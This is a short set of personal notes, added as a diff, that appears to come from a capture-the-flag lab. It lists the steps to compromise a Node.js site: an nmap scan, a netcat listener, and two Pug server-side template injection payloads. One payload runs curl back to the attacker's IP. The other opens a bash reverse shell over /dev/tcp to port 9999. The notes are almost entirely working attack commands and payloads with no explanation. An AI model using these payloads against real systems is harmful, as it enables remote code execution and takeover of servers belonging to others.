@@ -1,0 +1,19 @@
+1) nmpa -v -sC -sV -oN nmap/intitial 10.10.143.112
+2)check tunel ip address - ip a s tun0
+3) add listiner - nc -lnvp 9999
+
+4) payloades - doctype html
+head
+  title 
+    #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.8.20.168:9999')}()}
+
+5) site use to generet some reverse shell - https://www.revshells.com/
+
+6)payloades - doctype html
+head
+  title 
+    #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('bash -c "bash -i >& /dev/tcp/10.8.20.168/9999 0>&1"')}()}
+    
+7)cool site to find hakces -- hacktricks
+8) chekcing vulberty in code tool - snyk code test
+
